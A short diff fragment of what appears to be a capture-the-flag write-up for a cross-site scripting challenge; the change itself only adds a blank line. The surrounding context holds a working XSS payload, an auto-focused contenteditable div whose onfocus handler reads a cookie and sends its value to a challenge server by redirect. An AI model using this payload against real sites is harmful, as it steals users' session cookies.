@@ -74,6 +74,7 @@ To complete the exploit, you need to follow the following steps:
     - `onfocus`
     - `autofocus`
     - `contenteditable`
+      
 3. Write the tag with the correct attributes to perform the exploit.
    ```html
    <div contenteditable onfocus="window.location.replace('https://chall.necst.it/challenges/web6/verify/5682/'.concat(document.cookie.split(';').map((c) => c.trim()).filter((c) => c.split('=')[0] == 'JxNHT').map((c) => c.split('=')[1])[0]))" autofocus>
